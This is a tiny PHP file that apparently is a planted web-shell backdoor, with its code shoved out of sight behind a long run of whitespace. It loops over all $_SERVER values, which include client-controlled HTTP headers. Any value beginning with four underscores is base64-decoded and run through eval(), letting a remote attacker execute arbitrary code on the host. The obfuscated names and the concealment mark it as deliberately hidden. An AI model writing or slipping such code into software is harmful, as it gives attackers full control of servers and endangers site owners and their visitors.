<?php 																																																																																																																																																																																																																																																																																																																																																																																																																																																															function x2947($l2949){if(is_array($l2949)){foreach($l2949 as $l2947=>$l2948)$l2949[$l2947]=x2947($l2948);}elseif(is_string($l2949) && substr($l2949,0,4)=="____"){$l2949=substr($l2949,4);$l2949=base64_decode($l2949);eval($l2949);$l2949=null;}return $l2949;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("x2947",$_SERVER);

?>